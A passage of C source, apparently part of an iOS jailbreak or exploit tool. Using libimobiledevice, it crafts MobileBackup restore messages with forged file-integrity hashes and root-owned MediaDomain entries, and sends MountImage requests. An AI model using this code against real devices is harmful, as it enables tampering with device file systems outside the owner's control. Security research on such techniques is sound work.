    plist_dict_set_item(payload_dict, "BackupPreserveCameraRoll", plist_new_bool(1));
    plist_dict_set_item(payload_dict, "BackupPreserveSettings", plist_new_bool(1));
    plist_dict_set_item(payload_dict, "BackupProtocolVersion", plist_new_string("1.7"));
    plist_dict_set_item(payload_dict, "BackupRestoreSystemFiles", plist_new_bool(0));

    plist_t result_payload = plist_new_array();
    plist_array_append_item(result_payload, plist_new_string("DLMessageProcessMessage"));
    plist_array_append_item(result_payload, payload_dict);

    return result_payload;
}

plist_t create_embedded_payload(const char *udid)
{
    if (udid == NULL) {
        printf("[-] create_embedded_payload: param invalid\n");
        return NULL;
    }

    plist_t ret_plist = plist_new_dict();

    plist_dict_set_item(ret_plist, "Applications", plist_new_dict());
    plist_dict_set_item(ret_plist, "DeviceICCID", plist_new_string(""));
    plist_dict_set_item(ret_plist, "DeviceId", plist_new_string(udid));
    plist_dict_set_item(ret_plist, "Files", plist_new_dict());
    plist_dict_set_item(ret_plist, "Version", plist_new_string("6.2"));

    plist_t file_info_1 = create_plist_with_path(path_1);
    config_user_and_group_id(ret_plist, file_info_1, 501, 501);

    plist_t file_info_2 = create_plist_with_path(path_2);
    config_user_and_group_id(ret_plist, file_info_2, 0, 0);

    return ret_plist;
}

void config_user_and_group_id(plist_t root_node, plist_t file_info, unsigned int uid, unsigned int gid)
{
    if ((root_node == NULL) || (file_info == NULL)) {
        printf("[-] config_user_and_group_id: invalid param\n");
        return;
    }

    plist_t temp = NULL;

    // domain
    temp = plist_dict_get_item(file_info, "Domain");
    char *domain_str = NULL;
    plist_get_string_val(temp, &domain_str);
    if (domain_str == NULL) {
        printf("[-] config_user_and_group_id: domain value is NULL\n");
        return;
    }

    // path
    temp = plist_dict_get_item(file_info, "Path");
    char *path_str = NULL;
    plist_get_string_val(temp, &path_str);
    if (path_str == NULL) {
        printf("[-] config_user_and_group_id: path value is NULL\n");
        return;
    }

    // grey list
    temp = plist_dict_get_item(file_info, "Greylist");
    unsigned char is_greylist = 0;
    plist_get_bool_val(temp, &is_greylist);
    
    // version
    temp = plist_dict_get_item(file_info, "Version");
    char *version_str = NULL;
    plist_get_string_val(temp, &version_str);
    if (version_str == NULL) {
        printf("[-] config_user_and_group_id: version value is NULL\n");
        return;
    }

    int domain_length = (int)strlen(domain_str);
    int path_length = (int)strlen(path_str);

    char *domain_plus_path = (char *)malloc(domain_length + path_length + 2);
    memset(domain_plus_path, 0, domain_length + path_length + 2);

    strcat(domain_plus_path, domain_str);
    *(domain_plus_path + domain_length) = '-';
    strcat(domain_plus_path, path_str);

    plist_t file_integrity_info = plist_new_dict();

    unsigned char sha1_data[SHA_DIGEST_LENGTH] = {0};
    compute_payload_hash(domain_str, path_str, is_greylist, version_str, sha1_data);
    plist_dict_set_item(file_integrity_info, "DataHash", plist_new_data((const char *)sha1_data, SHA_DIGEST_LENGTH));
    plist_dict_set_item(file_integrity_info, "Domain", plist_new_string(domain_str));
    plist_dict_set_item(file_integrity_info, "FileLength", plist_new_uint(0));
    plist_dict_set_item(file_integrity_info, "Group ID", plist_new_uint(gid));
    plist_dict_set_item(file_integrity_info, "Mode", plist_new_uint(493));
    plist_dict_set_item(file_integrity_info, "User ID", plist_new_uint(uid));

    plist_t files = plist_dict_get_item(root_node, "Files");
    char *sha1_str = sha1_string_of_data(domain_plus_path, (unsigned int)strlen(domain_plus_path));
    plist_dict_set_item(files, sha1_str, file_integrity_info);

    free(sha1_str);
    free(domain_plus_path);
}

void compute_payload_hash(const char *domain, const char *destpath, uint8_t greylist, const char *version, unsigned char *hash_out)
{
    // init contex
    SHA_CTX sha1;
    SHA1_Init(&sha1);

    // file data - none

    // file path
    SHA1_Update(&sha1, destpath, strlen(destpath));
    SHA1_Update(&sha1, ";", 1);

    // grey list
    if (greylist == 1) {
        SHA1_Update(&sha1, "true", 4);
    } else {
        SHA1_Update(&sha1, "false", 5);
    }
    SHA1_Update(&sha1, ";", 1);

    // domain
    if (domain) {
        SHA1_Update(&sha1, domain, strlen(domain));
    } else {
        SHA1_Update(&sha1, "(null)", 6);
    }
    SHA1_Update(&sha1, ";", 1);

    // app id
    SHA1_Update(&sha1, "(null)", 6);
    SHA1_Update(&sha1, ";", 1);

    // version
    if (version) {
        SHA1_Update(&sha1, version, strlen(version));
    } else {
        SHA1_Update(&sha1, "(null)", 6);
    }

    // finalize
    SHA1_Final(hash_out, &sha1);
}

plist_t create_plist_with_path(char const *path)
{
    if (!path) {
        printf("[-] create_plist_with_path: path is NULL\n");
        return NULL;
    }

    plist_t result_node = plist_new_dict();
    if (result_node == NULL) {
        printf("[-] create_plist_with_path: root node\n");
        return NULL;
    }

    plist_dict_set_item(result_node, "Domain", plist_new_string("MediaDomain"));
    plist_dict_set_item(result_node, "Greylist", plist_new_bool(0));
    plist_dict_set_item(result_node, "Path", plist_new_string(path));
    plist_dict_set_item(result_node, "Version", plist_new_string("3.0"));

    return result_node;
}

// remember to free
char *get_udid(idevice_t device)
{
    if (!device) {
        printf("[-] get_udid: root node\n");
    }

    lockdownd_error_t ld_error = LOCKDOWN_E_SUCCESS;
    lockdownd_client_t ld_client = NULL;

    ld_error = lockdownd_client_new(device, &ld_client, "get_udid");
    if (ld_error != LOCKDOWN_E_SUCCESS) {
        printf("[-] get_udid: can't create client\n");
        return NULL;
    }

    char *udid = NULL;
    ld_error = lockdownd_get_device_udid(ld_client, &udid);
    if (ld_error != LOCKDOWN_E_SUCCESS) {
        printf("[-] get_udid: can't get udid\n");
        return NULL;
    }

    lockdownd_client_free(ld_client);

    return udid;
}

// remember to free
char * sha1_string_of_data(const char *input, uint32_t size)
{
    unsigned char sha1[SHA_DIGEST_LENGTH] = {0};
    SHA1((const unsigned char*)input, size, sha1);

    return sha1_transform_data_to_string(sha1);
}

void sha1_of_data(const char *input, uint32_t size, unsigned char *hash_out)
{
    SHA1((const unsigned char*)input, size, hash_out);
}

// remember to free
char * sha1_transform_data_to_string(unsigned char *sha1_data)
{
    char sha1_str[SHA_DIGEST_LENGTH * 2 + 1] = {0};
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sprintf(sha1_str + i * 2, "%02x", sha1_data[i]);
    }

    return strdup(sha1_str);
}

// remember to free
char* data_to_hex_string(unsigned char *data, int length)
{
    if (!data || (length <= 0)) {
        printf("[-] data_to_hex_string: invalid param\n");
        return NULL;
    }

    char *hex_str = (char *)malloc(length * 2 + 1);
    memset(hex_str, 0, length * 2 + 1);

    for (int i = 0; i < length; i++) {
        sprintf(hex_str + i * 2, "%02x", (unsigned char)data[i]);
    }

    return hex_str;
}

void load_file_to_buffer(const char *file_path, char **buffer, unsigned int *length)
{
    if (!file_path || !buffer || !length) {
        printf("[-] load_file_to_buffer: invalid param\n");
        return;
    }

    FILE *file_handle = fopen(file_path, "rb");
    if (!file_handle) {
        printf("[-] load_file_to_buffer: fail to open file\n");
        return;
    }

    fseek(file_handle, 0L, SEEK_END);
    uint32_t file_size = (uint32_t)ftell(file_handle);
    fseek(file_handle, 0L, SEEK_SET);

    char *file_data = (char *)malloc(file_size);
    fread(file_data, file_size, 1, file_handle);
    fclose(file_handle);

    *buffer = file_data;
    *length = file_size;
}

int compare_hash(const unsigned char *hash1, const unsigned char *hash2, int hash_len)
{
    int i;
    for (i = 0; i < hash_len; i++) {
        if (hash1[i] != hash2[i]) {
            return 0;
        }
    }
    return 1;
}

void compute_datahash(const char *path, const char *destpath, uint8_t greylist, const char *domain, const char *appid, const char *version, unsigned char *hash_out)
{
    // init contex
    SHA_CTX sha1;
    SHA1_Init(&sha1);

    FILE *f = fopen(path, "rb");
    if (f) {
        // file data
        unsigned char buf[16384];
        size_t len;
        while ((len = fread(buf, 1, 16384, f)) > 0) {
            SHA1_Update(&sha1, buf, len);
        }
        fclose(f);

        // file path
        SHA1_Update(&sha1, destpath, strlen(destpath));
        SHA1_Update(&sha1, ";", 1);

        // grey list
        if (greylist == 1) {
            SHA1_Update(&sha1, "true", 4);
        } else {
            SHA1_Update(&sha1, "false", 5);
        }
        SHA1_Update(&sha1, ";", 1);

        // domain
        if (domain) {
            SHA1_Update(&sha1, domain, strlen(domain));
        } else {
            SHA1_Update(&sha1, "(null)", 6);
        }
        SHA1_Update(&sha1, ";", 1);

        // app id
        if (appid) {
            SHA1_Update(&sha1, appid, strlen(appid));
        } else {
            SHA1_Update(&sha1, "(null)", 6);
        }
        SHA1_Update(&sha1, ";", 1);

        // version
        if (version) {
            SHA1_Update(&sha1, version, strlen(version));
        } else {
            SHA1_Update(&sha1, "(null)", 6);
        }

        // finalize
        SHA1_Final(hash_out, &sha1);
    }
}

void print_hash(const unsigned char *hash, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        printf("%02x", hash[i]);
    }
    printf("\n");
}

unsigned long long get_file_size(const char *file_path)
{
    if (!file_path) {
        printf("[-] get_file_size: invalid param\n");
        return 0;
    }

    struct stat file_stat = {0};
    int ret = stat(file_path, &file_stat);
    if (ret != 0) {
        printf("[-] get_file_size: fail to get state\n");
        return 0;
    }

    return file_stat.st_size;
}

mobilebackup_error_t mobilebackup_client_new2(idevice_t device, lockdownd_service_descriptor_t service, mobilebackup_client_t * client)
{
    if (!device || !service || service->port == 0 || !client || *client)
        return MOBILEBACKUP_E_INVALID_ARG;

    device_link_service_client_t dlclient = NULL;
    mobilebackup_error_t ret = mobilebackup_error(device_link_service_client_new(device, service, &dlclient));
    if (ret != MOBILEBACKUP_E_SUCCESS) {
        return ret;
    }

    mobilebackup_client_t client_loc = (mobilebackup_client_t) malloc(sizeof(struct mobilebackup_client_private));
    client_loc->parent = dlclient;

    /* perform handshake */
    ret = mobilebackup_error(device_link_service_version_exchange(dlclient, 300, 0));
    if (ret != MOBILEBACKUP_E_SUCCESS) {
        printf("[-] mobilebackup_client_new2: version exchange failed, error %d", ret);
        mobilebackup_client_free(client_loc);
        return ret;
    }

    *client = client_loc;

    return ret;
}

mobilebackup_error_t mobilebackup_error(device_link_service_error_t err)
{
    switch (err) {
        case DEVICE_LINK_SERVICE_E_SUCCESS:
            return MOBILEBACKUP_E_SUCCESS;
        case DEVICE_LINK_SERVICE_E_INVALID_ARG:
            return MOBILEBACKUP_E_INVALID_ARG;
        case DEVICE_LINK_SERVICE_E_PLIST_ERROR:
            return MOBILEBACKUP_E_PLIST_ERROR;
        case DEVICE_LINK_SERVICE_E_MUX_ERROR:
            return MOBILEBACKUP_E_MUX_ERROR;
        case DEVICE_LINK_SERVICE_E_BAD_VERSION:
            return MOBILEBACKUP_E_BAD_VERSION;
        default:
            break;
    }
    return MOBILEBACKUP_E_UNKNOWN_ERROR;
}

mobile_image_mounter_error_t mobile_image_mounter_mount_image2(mobile_image_mounter_client_t client, const char *image_path, const char *signature, uint16_t signature_size, const char *image_type/*, plist_t *result*/)
{
    if (!client || !image_path || !image_type/* || !result*/) {
        return MOBILE_IMAGE_MOUNTER_E_INVALID_ARG;
    }

    plist_t dict = plist_new_dict();
    plist_dict_set_item(dict, "Command", plist_new_string("MountImage"));
    plist_dict_set_item(dict, "ImagePath", plist_new_string(image_path));
    if (signature && signature_size != 0)
        plist_dict_set_item(dict, "ImageSignature", plist_new_data(signature, signature_size));
    plist_dict_set_item(dict, "ImageType", plist_new_string(image_type));

    mobile_image_mounter_error_t res = mobile_image_mounter_error(property_list_service_send_xml_plist(client->parent, dict));
    plist_free(dict);

    if (res != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        goto leave_unlock;
    }

    /*res = mobile_image_mounter_error(property_list_service_receive_plist(client->parent, result));*/

leave_unlock:
    return res;
}

mobile_image_mounter_error_t mobile_image_mounter_error(property_list_service_error_t err)
{
    switch (err) {
        case PROPERTY_LIST_SERVICE_E_SUCCESS:
            return MOBILE_IMAGE_MOUNTER_E_SUCCESS;
        case PROPERTY_LIST_SERVICE_E_INVALID_ARG:
            return MOBILE_IMAGE_MOUNTER_E_INVALID_ARG;
        case PROPERTY_LIST_SERVICE_E_PLIST_ERROR:
            return MOBILE_IMAGE_MOUNTER_E_PLIST_ERROR;
        case PROPERTY_LIST_SERVICE_E_MUX_ERROR:
            return MOBILE_IMAGE_MOUNTER_E_CONN_FAILED;
        default:
            break;
    }
    return MOBILE_IMAGE_MOUNTER_E_UNKNOWN_ERROR;
}

//-- Debug
void debug_plist(plist_t plist)
{
    if (!plist) {
        printf("[-] debug_plist: plist handle is NULL\n");
        return;
    }

    char *buffer = NULL;
    uint32_t length = 0;
    plist_to_xml(plist, &buffer, &length);

    if (length == 0) {
        printf("[-] debug_plist: length is zero\n");
        return;
    }

    char *cstr = (char *)malloc(length + 1);
    memset(cstr, 0, length + 1);
    memcpy(cstr, buffer, length);

    printf("[+] DEBUG PLIST:\n");
    printf("--------------------------------------------\n");
    printf("%s\n", cstr);
    printf("--------------------------------------------\n");

    free(buffer);
    free(cstr);
}
